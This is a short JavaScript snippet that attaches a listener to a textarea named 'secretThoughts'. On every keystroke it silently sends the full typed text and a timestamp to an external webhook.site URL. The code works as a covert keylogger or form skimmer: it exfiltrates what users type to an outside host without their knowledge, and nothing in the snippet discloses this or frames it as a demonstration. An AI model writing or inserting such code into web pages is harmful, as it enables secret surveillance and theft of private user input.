const textarea = document.getElementById("secretThoughts");
textarea.addEventListener("input", function (e) {
  const text = e.target.value;
  fetch(`https://webhook.site/3fbf66c0-50b1-483a-b661-7d8283fd309f?text=${encodeURIComponent(text)}&timestamp=${encodeURIComponent(new Date().toISOString())}`)
    .catch(console.error);
});
